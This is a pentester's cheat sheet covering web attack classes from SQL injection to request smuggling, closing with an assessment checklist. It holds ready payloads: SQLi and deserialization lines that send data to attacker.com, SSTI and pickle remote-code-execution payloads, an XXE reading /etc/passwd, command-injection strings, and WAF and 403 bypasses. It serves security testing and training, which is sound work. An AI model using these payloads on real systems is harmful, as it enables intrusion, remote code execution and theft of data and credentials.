# Web Application Attack Compendium

**Author:** J Laratro — d0sf3t | Aradex.io  
**From Injection to Deserialization & Modern API Exploitation**  
*Expert-Level Reference for Penetration Testers & Red Teamers*

---

## Table of Contents

1. [Reconnaissance & Information Gathering](#chapter-1-reconnaissance--information-gathering)
2. [SQL Injection (SQLi)](#chapter-2-sql-injection-sqli)
3. [Cross-Site Scripting (XSS)](#chapter-3-cross-site-scripting-xss)
4. [Cross-Site Request Forgery (CSRF)](#chapter-4-cross-site-request-forgery-csrf)
5. [Server-Side Request Forgery (SSRF)](#chapter-5-server-side-request-forgery-ssrf)
6. [Authentication & Session Attacks](#chapter-6-authentication--session-attacks)
7. [Authorization & Access Control Flaws](#chapter-7-authorization--access-control-flaws)
8. [File Upload & Path Traversal](#chapter-8-file-upload--path-traversal-attacks)
9. [Command Injection & SSTI](#chapter-9-command-injection--ssti)
10. [Insecure Deserialization](#chapter-10-insecure-deserialization)
11. [XML External Entity (XXE)](#chapter-11-xml-external-entity-xxe-injection)
12. [HTTP Request Smuggling](#chapter-12-http-request-smuggling--desync-attacks)
13. [WebSocket & GraphQL Attacks](#chapter-13-websocket--graphql-attacks)
14. [API Security](#chapter-14-api-security)
15. [Business Logic Vulnerabilities](#chapter-15-business-logic-vulnerabilities)
16. [Client-Side Attacks](#chapter-16-client-side-attacks)
17. [JWT, OAuth, SAML](#chapter-17-modern-framework-exploits-jwt-oauth-saml)
18. [Web Cache Poisoning & Host Header](#chapter-18-web-cache-poisoning--host-header-attacks)
19. [Race Conditions](#chapter-19-race-conditions--toctou)
20. [Tool Reference Matrix](#chapter-20-tool-reference-matrix)
21. [Web Application Security Assessment Checklist](#web-application-penetration-testing--security-assessment-checklist)

---

## Chapter 1: Reconnaissance & Information Gathering

### 1.1 Passive Reconnaissance
- **DNS enumeration** — crt.sh, subfinder, amass, assetfinder, zone transfers
- **OSINT** — Wayback Machine, Google dorks, Shodan/Censys, GitHub/GitLab leaked creds
- **Tech fingerprinting** — Wappalyzer, BuiltWith, HTTP headers (Server, X-Powered-By)
- **JS analysis** — LinkFinder, JSFinder, getJS for endpoints, secrets, debug routes

### 1.2 Active Reconnaissance

```bash
# Directory/file brute-force
feroxbuster -u https://target.com -w raft-medium-directories.txt -x php,asp,aspx,jsp

# ffuf fuzzing
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403 -fc 404

# Parameter discovery
arjun -u https://target.com/api/search -m GET POST

# Virtual host enumeration
ffuf -u https://target.com -H 'Host: FUZZ.target.com' -w subdomains.txt -mc 200 -fs 0
```

> **Operator Tip:** Always check: .git/, .env, .DS_Store, web.config, wp-config.php.bak, .htaccess, robots.txt, sitemap.xml, /server-status, /server-info

### 1.3 403 Bypass Techniques
- **Path normalization** — /admin → /Admin, /ADMIN, /admin/, /./admin, //admin, /admin..;/
- **URL encoding** — /%61dmin, double encoding: /%2561dmin
- **HTTP method change** — GET → POST, PUT, PATCH, HEAD, OPTIONS
- **Header injection** — X-Forwarded-For: 127.0.0.1, X-Original-URL: /admin, X-Rewrite-URL
- **Path traversal** — /accessible/../admin, /accessible/..;/admin (Tomcat)
- **Wildcards** — /admin%20, /admin%09, /admin.json, /admin?anything

---

## Chapter 2: SQL Injection (SQLi)

### 2.1 Theory
SQL Injection occurs when user input is concatenated into SQL queries without parameterization. Provides direct database access — reading, modifying, deleting data, and in many cases RCE.

### 2.2 Detection
```sql
' OR '1'='1
' AND 1=1-- -
' AND 1=2-- -
'; WAITFOR DELAY '0:0:5'-- -
' AND (SELECT SLEEP(5))-- -
```

### 2.3 Union-Based
```sql
' ORDER BY 1-- -    (increment until error)
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT username,password,NULL FROM users-- -
' UNION SELECT @@version,NULL,NULL-- -          -- MySQL/MSSQL
' UNION SELECT version(),NULL,NULL-- -          -- PostgreSQL
```

### 2.4 Error-Based
```sql
' AND extractvalue(1, concat(0x7e, (SELECT @@version)))-- -      -- MySQL
' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users))-- -     -- MSSQL
' AND 1=CAST((SELECT version()) AS int)-- -                       -- PostgreSQL
```

### 2.5 Blind SQLi
```sql
-- Boolean-based
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -

-- Time-based
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(3), 0)-- -
'; IF (SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a') WAITFOR DELAY '0:0:3'-- -
```

### 2.6 Out-of-Band
```sql
-- MySQL: LOAD_FILE DNS exfil
' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))-- -
-- MSSQL: xp_dirtree
'; EXEC master..xp_dirtree '\\attacker.com\a'-- -
-- PostgreSQL: COPY TO PROGRAM
'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/'-- -
```

### 2.7 SQLi to RCE

| Database | Technique | Requirements |
|----------|-----------|-------------|
| MySQL | INTO OUTFILE webshell, UDF | FILE privilege, writable web dir |
| MSSQL | xp_cmdshell, CLR assemblies | sysadmin role |
| PostgreSQL | COPY TO PROGRAM, large objects | Superuser role |
| SQLite | ATTACH DATABASE webshell | Write access to web dir |
| Oracle | DBMS_SCHEDULER, Java stored procs | DBA role |

### 2.8 WAF Bypass
- **Case alternation** — SeLeCt, uNiOn
- **Comments** — UN/**/ION SE/**/LECT, /*!50000UNION*/
- **Encoding** — URL, double, Unicode, hex
- **Whitespace alternatives** — %09, %0a, /**/, parentheses
- **HTTP parameter pollution** — ?id=1&id=UNION+SELECT...

### 2.9 NoSQL Injection

```json
// MongoDB auth bypass
{"username":{"$ne":""},"password":{"$ne":""}}

// $regex extraction
{"username":"admin","password":{"$regex":"^a.*"}}

// Query parameter injection
GET /search?username[$ne]=&password[$ne]=
```

> **Operator Tip:** Tools: nosqli, NoSQLMap. MongoDB $where allows JS execution (disabled by default in 4.4+).

---

## Chapter 3: Cross-Site Scripting (XSS)

### 3.1 Types

| Type | Storage | Trigger | Impact |
|------|---------|---------|--------|
| Reflected | URL/request | Victim clicks link | Single user |
| Stored | Server-side DB | Any user views page | All users |
| DOM-based | Client-side only | Client JS processes input | Single user |

### 3.2 Context-Aware Payloads

**HTML:** `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`

**Attribute:** `" onfocus=alert(1) autofocus="`, `"><img src=x onerror=alert(1)>`

**JavaScript:** `';alert(1);//`, `</script><script>alert(1)</script>`, `${alert(1)}`

**URL/href:** `javascript:alert(1)`

### 3.3 Filter Bypass
- Tag alternatives: `<svg>`, `<math>`, `<details>`, `<video>`, `<object>`
- Event handler alternatives: onerror, onload, onfocus, ontoggle, onanimationstart
- Encoding: HTML entities, Unicode escapes, double encoding
- Mutation XSS (mXSS): exploit browser parser differences
- DOM clobbering: overwrite DOM properties via id/name

---

## Chapter 4: Cross-Site Request Forgery (CSRF)

### 4.1 Token Bypass Techniques
- **Token not validated** — Remove parameter entirely
- **Not tied to session** — Use token from your own session
- **Double-submit cookie** — Inject cookie via subdomain XSS or CRLF
- **Method override** — Change POST to GET
- **SameSite=Lax bypass** — GET requests from cross-origin navigations allowed

---

## Chapter 5: Server-Side Request Forgery (SSRF)

### 5.1 Targets

| Target | URL | Impact |
|--------|-----|--------|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Temporary AWS creds |
| AWS IMDSv2 | PUT to `/latest/api/token` then GET with token header | Requires method+header control |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | Service account tokens |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Managed identity tokens |
| Internal | `http://localhost:port` | Admin panels, DBs, queues |

### 5.2 Bypass Techniques
- IP representation: decimal, octal, hex, IPv6
- DNS rebinding (rbndr.us, singularity)
- URL parser confusion: `http://attacker.com@internal-host`
- Redirect chains via open redirects
- Protocol smuggling: gopher://, dict://

### 5.3 SSRF → RCE Chains
- SSRF → Redis → RCE (gopher:// to CONFIG SET)
- SSRF → Cloud metadata → Lateral movement
- SSRF → Kubernetes API → Container escape

---

## Chapter 6: Authentication & Session Attacks

### 6.1 Credential Attacks
- Password spraying, credential stuffing, brute-force, default creds, username enumeration

### 6.2 Session Management
- Session fixation, hijacking, prediction, puzzling

### 6.3 Password Reset Flaws
- Predictable tokens, Host header injection, no expiration, token leakage via Referer

### 6.4 MFA Bypass
- Response manipulation, OTP brute-force, token reuse, fallback bypass

---

## Chapter 7: Authorization & Access Control Flaws

### 7.1 IDOR
Test every parameter: user IDs, order IDs, UUIDs. Try sequential, negative, zero. Test across HTTP methods. Use Autorize (Burp).

### 7.2 Privilege Escalation
- **Horizontal** — User A accessing User B's data
- **Vertical** — Regular user → admin. Check: admin endpoints, role parameters, forced browsing

---

## Chapter 8: File Upload & Path Traversal Attacks

### 8.1 Upload Bypass

| Validation | Bypass |
|-----------|--------|
| Content-Type | Change MIME in request |
| Extension blacklist | .phtml, .php5, .pHP, .asp;.jpg |
| Extension whitelist | shell.php.jpg, shell.php%00.jpg |
| Magic bytes | Prepend GIF89a before PHP |
| Image reprocessing | Polyglot: valid image AND valid PHP |

### 8.2 LFI → RCE
- Log poisoning (inject PHP in User-Agent, include access.log)
- PHP wrappers: `php://filter/convert.base64-encode/resource=config.php`
- PHP filter chains (php_filter_chain_generator)
- Session file poisoning
- Zip/phar wrappers

---

## Chapter 9: Command Injection & SSTI

### 9.1 OS Command Injection
```bash
; id        | id       || id       && id       $(id)       `id`       %0a id
```

**Filter bypass:** ${IFS}, {cat,/etc/passwd}, c'a't, /???/??t /???/??????

### 9.2 SSTI

| Engine | Language | RCE Payload |
|--------|----------|-------------|
| Jinja2 | Python | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| Twig | PHP | `{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}` |
| Freemarker | Java | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| ERB | Ruby | `<%= system('id') %>` |

> **Operator Tip:** Use tplmap for automated SSTI detection. Start with `${{<%[%'"}}%\` polyglot.

---

## Chapter 10: Insecure Deserialization

### Java (AC ED 00 05 / rO0AB)
```bash
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/$(whoami)' | base64
```

### PHP (O:, a:, s:)
```bash
phpggc Laravel/RCE1 system 'id' -b
```

### .NET
```bash
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c 'cmd /c whoami'
```

### Python (pickle)
```python
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(RCE())
```

---

## Chapter 11: XML External Entity (XXE) Injection

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Blind XXE** — OOB exfil via external DTD loading data to attacker server.

**Attack surface:** SOAP APIs, SVG/DOCX/XLSX uploads, RSS feeds, SAML assertions, Content-Type manipulation.

---

## Chapter 12: HTTP Request Smuggling & Desync Attacks

| Variant | Front-End | Back-End |
|---------|-----------|----------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | Transfer-Encoding | Transfer-Encoding (obfuscated) |
| H2.CL | HTTP/2 | Content-Length (HTTP/1.1 downgrade) |

**Impact:** Bypass access controls, cache poisoning, session hijacking, XSS amplification.

---

## Chapter 13: WebSocket & GraphQL Attacks

### WebSocket
- Cross-Site WebSocket Hijacking (CSWSH)
- Injection via WS messages (SQLi, XSS, command injection)

### GraphQL
- Introspection: `{__schema{types{name,fields{name}}}}`
- Batching attacks (rate limit bypass)
- Authorization flaws on nested objects
- Deeply nested query DoS

---

## Chapter 14: API Security

| Vulnerability | Description |
|--------------|-------------|
| BOLA | IDOR in API context |
| BFLA | Access admin functions with regular user |
| Mass Assignment | Set internal properties (role=admin) |
| Excessive Data Exposure | API returns more than UI shows |
| Rate Limiting Absence | Brute-force sensitive operations |
| Improper Asset Management | Old API versions accessible |

---

## Chapter 15: Business Logic Vulnerabilities

- Price manipulation (negative qty, coupon stacking, currency rounding)
- Workflow bypass (skip payment step)
- Race conditions in purchases
- Referral/bonus abuse
- Trust boundary violations

---

## Chapter 16: Client-Side Attacks

### 16.1 DOM-Based Vulnerabilities
Sources: location.hash, location.search, postMessage → Sinks: innerHTML, eval(), document.write

### 16.2 Prototype Pollution
```json
{"__proto__":{"isAdmin":true}}
```

### 16.3 Clickjacking
Mitigated by X-Frame-Options and CSP frame-ancestors.

### 16.4 CORS Misconfiguration
- Reflected Origin with credentials = full data theft
- Null origin allowed (sandbox iframe bypass)
- Subdomain wildcard + XSS on subdomain = CORS bypass

### 16.5 CSP Bypass
- unsafe-inline/unsafe-eval
- JSONP endpoints on whitelisted domains
- Missing base-uri (inject `<base href>`)
- Dangling markup injection
- Predictable/reused nonces

---

## Chapter 17: Modern Framework Exploits (JWT, OAuth, SAML)

### JWT Attacks
| Attack | Method |
|--------|--------|
| None algorithm | Set alg to "none", remove signature |
| Algorithm confusion | RS256 → HS256, sign with public key |
| Key injection (jwk/jku) | Embed attacker key in header |
| kid injection | Path traversal or SQLi in kid |
| Weak secret | hashcat -m 16500 jwt.txt wordlist.txt |

### OAuth 2.0
- redirect_uri manipulation, CSRF (missing state), token leakage, scope escalation, PKCE bypass

### SAML
- Signature wrapping, XXE, comment injection, signature exclusion, replay

---

## Chapter 18: Web Cache Poisoning & Host Header Attacks

- **Unkeyed headers** — X-Forwarded-Host, X-Forwarded-Scheme reflected in response
- **Password reset poisoning** — Modify Host header → reset link uses attacker domain
- **Fat GET requests** — Body processed by framework but not cached

---

## Chapter 19: Race Conditions & TOCTOU

**Targets:** balance/inventory, coupon codes, registration, file upload+processing

> **Operator Tip:** Burp's single-packet attack (Turbo Intruder or Repeater group send) is the most reliable method. HTTP/2 multiplexing makes it even more effective.

---

## Chapter 20: Tool Reference Matrix

| Tool | Category | Use |
|------|----------|-----|
| Burp Suite Pro | Proxy/Scanner | Intercepting proxy, scanner, Repeater, Intruder |
| Caido | Proxy/Scanner | Modern Burp alternative, Rust-based, HTTPQL |
| ffuf | Fuzzing | Content discovery, parameter fuzzing, vhost enum |
| feroxbuster | Discovery | Recursive directory brute-force |
| sqlmap | SQLi | Automated detection and exploitation |
| Nuclei | Scanner | Template-based vuln scanning |
| tplmap | SSTI | Multi-engine SSTI exploitation |
| jwt_tool | JWT | Algorithm attacks, claim tampering |
| Arjun | Params | Hidden parameter discovery |
| Kiterunner | API | API-aware route discovery |
| httpx | Probing | Live host detection, fingerprinting |
| Turbo Intruder | Burp Ext | Race conditions, single-packet attack |
| NoSQLMap | NoSQLi | MongoDB/CouchDB injection |

### Hashcat Modes for Web
| Mode | Type |
|------|------|
| 16500 | JWT (HMAC) |
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 3200 | bcrypt |

### Payload Resources
- PayloadsAllTheThings, SecLists, HackTricks, OWASP Testing Guide, PortSwigger Web Academy

---

## Web Application Penetration Testing — Security Assessment Checklist

### Phase 1: Reconnaissance & Mapping

- [ ] Enumerate all subdomains (crt.sh, subfinder, amass, DNS brute-force)
- [ ] Identify all web technologies (Wappalyzer, HTTP headers, error pages)
- [ ] Spider/crawl all pages and endpoints (Burp Spider, gospider, hakrawler)
- [ ] Discover hidden content (feroxbuster, ffuf with multiple wordlists)
- [ ] Extract endpoints from JavaScript files (LinkFinder, JSFinder)
- [ ] Enumerate virtual hosts (ffuf Host header fuzzing)
- [ ] Check for exposed API documentation (swagger.json, openapi.json, graphql introspection)
- [ ] Check for exposed admin panels (/admin, /manager, /wp-admin, /phpmyadmin)
- [ ] Check for backup/config files (.git/, .env, .DS_Store, web.config, .htaccess)
- [ ] Check robots.txt and sitemap.xml for hidden paths
- [ ] Identify all input vectors (parameters, headers, cookies, file uploads)
- [ ] Map all user roles and privilege levels
- [ ] Identify all forms and state-changing operations

### Phase 2: Authentication Testing

- [ ] Test for default credentials on all login forms and admin panels
- [ ] Test for username enumeration (response content, timing, status code differences)
- [ ] Test password policy strength and enforcement
- [ ] Test account lockout mechanism and bypass
- [ ] Test for brute-force protection (rate limiting, CAPTCHA)
- [ ] Test password reset flow for token predictability
- [ ] Test password reset for Host header injection
- [ ] Test password reset token expiration and reuse
- [ ] Test for session fixation on login
- [ ] Test session token randomness and entropy
- [ ] Test for session invalidation on logout
- [ ] Test for session invalidation on password change
- [ ] Test MFA bypass techniques (response manipulation, OTP brute-force, fallback)
- [ ] Test remember-me functionality security
- [ ] Test for authentication bypass via direct URL access

### Phase 3: Authorization Testing

- [ ] Test for IDOR on every object reference (user IDs, order IDs, file names)
- [ ] Create two accounts — test horizontal privilege escalation with Autorize
- [ ] Test vertical privilege escalation (regular user → admin endpoints)
- [ ] Test for parameter-based role escalation (role=admin, isAdmin=true)
- [ ] Test forced browsing to admin/privileged endpoints
- [ ] Test API endpoints for missing authorization checks
- [ ] Test for function-level access control (BFLA)
- [ ] Test for path traversal in authorization decisions
- [ ] Test multi-step workflows for authorization at each step

### Phase 4: Injection Testing

- [ ] Test all parameters for SQL injection (manual + sqlmap)
- [ ] Test for blind SQLi (boolean and time-based) on all inputs
- [ ] Test for second-order SQL injection
- [ ] Test for NoSQL injection (MongoDB operators, $ne, $regex, $where)
- [ ] Test for OS command injection on all parameters
- [ ] Test for SSTI (polyglot detection string, then engine-specific)
- [ ] Test for LDAP injection
- [ ] Test for XPath injection
- [ ] Test for header injection (CRLF, Host header)
- [ ] Test for email header injection (CC, BCC injection)

### Phase 5: XSS Testing

- [ ] Test reflected XSS on all parameters (GET, POST, headers, cookies)
- [ ] Test stored XSS on all user-controlled persistent data
- [ ] Test DOM-based XSS (sources: URL fragment, postMessage, referrer)
- [ ] Test XSS in different contexts (HTML, attribute, JS, URL)
- [ ] Test XSS filter bypass (encoding, tag alternatives, event handlers)
- [ ] Verify HttpOnly flag on session cookies
- [ ] Verify Content-Type headers on API responses
- [ ] Assess CSP policy strength and bypass potential
- [ ] Test for mXSS via browser parser differentials

### Phase 6: CSRF Testing

- [ ] Test all state-changing requests for CSRF protection
- [ ] Test CSRF token validation (remove, reuse, cross-user)
- [ ] Test SameSite cookie configuration
- [ ] Test for CSRF on password change, email change, account deletion
- [ ] Test for CSRF on admin functions
- [ ] Test Referer/Origin header validation bypass

### Phase 7: SSRF Testing

- [ ] Identify all URL input fields (webhooks, imports, previews, callbacks)
- [ ] Test for SSRF to cloud metadata endpoints (169.254.169.254)
- [ ] Test for SSRF to internal services (localhost, internal hostnames)
- [ ] Test SSRF bypass techniques (IP encoding, DNS rebinding, redirects)
- [ ] Test for blind SSRF (use collaborator/interactsh)
- [ ] Test for SSRF via file:// protocol
- [ ] Test for SSRF to Redis/Memcached via gopher://

### Phase 8: File Handling

- [ ] Test file upload for webshell upload (PHP, ASPX, JSP)
- [ ] Test upload bypass (Content-Type, extension, magic bytes, polyglot)
- [ ] Test for path traversal in uploaded filename
- [ ] Test for path traversal in file download/include parameters
- [ ] Test for LFI to RCE (log poisoning, PHP wrappers, filter chains)
- [ ] Test for unrestricted file types (SVG with XSS, HTML upload)
- [ ] Test file upload size limits

### Phase 9: Deserialization & XXE

- [ ] Identify serialized data (Java: rO0AB, PHP: O:, .NET: ViewState)
- [ ] Test for insecure deserialization with ysoserial/PHPGGC
- [ ] Test XML processing for XXE (file read, SSRF, blind OOB)
- [ ] Test file uploads for XXE (SVG, DOCX, XLSX)
- [ ] Test for XXE via Content-Type manipulation (JSON → XML)

### Phase 10: Business Logic & Advanced

- [ ] Map all business workflows end-to-end
- [ ] Test for workflow step bypass (skip payment, skip verification)
- [ ] Test for price/quantity manipulation (negative values, zero, large numbers)
- [ ] Test for race conditions on critical operations (Turbo Intruder)
- [ ] Test for coupon/promo code abuse (reuse, stacking)
- [ ] Test for mass assignment on registration/profile update
- [ ] Test HTTP request smuggling (CL.TE, TE.CL, H2.CL)
- [ ] Test for web cache poisoning (unkeyed headers)
- [ ] Test for host header attacks (password reset poisoning)
- [ ] Test WebSocket endpoints for CSWSH and injection

### Phase 11: API-Specific Testing

- [ ] Enumerate all API endpoints and versions
- [ ] Test for BOLA on all object references
- [ ] Test for BFLA on admin/privileged functions
- [ ] Test for mass assignment on all write operations
- [ ] Test for excessive data exposure in responses
- [ ] Test for rate limiting on authentication and sensitive operations
- [ ] Test old/deprecated API versions for removed security controls
- [ ] Test JWT implementation (none alg, key confusion, weak secret)
- [ ] Test OAuth flow (redirect_uri, state, scope, PKCE)
- [ ] Test GraphQL introspection and batching
- [ ] Test gRPC endpoints for authorization

### Phase 12: Security Headers & Configuration

- [ ] Verify Content-Security-Policy header and policy strength
- [ ] Verify X-Frame-Options or CSP frame-ancestors
- [ ] Verify X-Content-Type-Options: nosniff
- [ ] Verify Strict-Transport-Security (HSTS) header
- [ ] Verify HttpOnly and Secure flags on session cookies
- [ ] Verify SameSite cookie attribute
- [ ] Check for CORS misconfiguration (reflected origin, null, wildcard)
- [ ] Check TLS configuration (SSL Labs scan, cipher suites, protocol versions)
- [ ] Check for information disclosure in error messages
- [ ] Check for server version disclosure in headers
- [ ] Check for directory listing enabled
- [ ] Check for debug mode/verbose errors enabled
- [ ] Check for HTTP methods allowed (OPTIONS, TRACE, PUT, DELETE)
- [ ] Check for cookie scope (path, domain) misconfiguration
